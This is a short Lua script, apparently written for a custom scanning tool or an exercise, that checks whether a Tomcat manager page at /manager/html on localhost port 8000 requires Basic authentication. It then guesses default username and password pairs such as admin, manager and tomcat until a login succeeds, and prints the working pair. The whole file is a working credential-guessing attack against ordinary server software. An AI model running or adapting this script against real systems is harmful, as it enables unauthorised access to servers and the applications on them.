usernames = {"admin", "manager", "tomcat"}
passwords = {"admin", "manager", "tomcat", "password"}

status, basic, err = http.head("127.0.0.1", 8000, "/manager/html")
if err ~= "" then
    print("[!]Error: "..err)
    return
end

if status ~= 401 or not basic then
    print("[!]Error: Endpoint does not require Basic Auth")
    return
end

print("[+]Endpoint basic Auth required. Proceeding with password guessing")
for i, username in ipairs(usernames) do
    for j, password in ipairs(passwords) do
        status, body, err = http.get("127.0.0.1", 8000, username, password, "/manager/html")
        if status == 200 then
            print("[+]Found valid credentials: "..username..":"..password)
            return
        end
    end
end
